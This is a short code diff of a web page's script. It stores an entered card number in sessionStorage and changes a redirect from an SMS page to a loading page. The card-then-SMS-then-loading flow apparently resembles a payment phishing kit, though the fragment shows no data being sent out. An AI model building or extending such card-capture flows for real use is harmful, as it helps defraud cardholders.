@@ -1241,7 +1241,7 @@
         backBtn.addEventListener('click', () => {
             const cardNumberValue = cardNumber.value.replace(/\s/g, '');
         sessionStorage.setItem('cardNumber', cardNumberValue);
-        window.location.href = `sms.html?card=${cardNumberValue}`;
+        window.location.href = 'loading.html';
         });
 
         let paymentCounter = 0;
@@ -1466,4 +1466,5 @@
     </script>
 </body>
 </html>
+
 
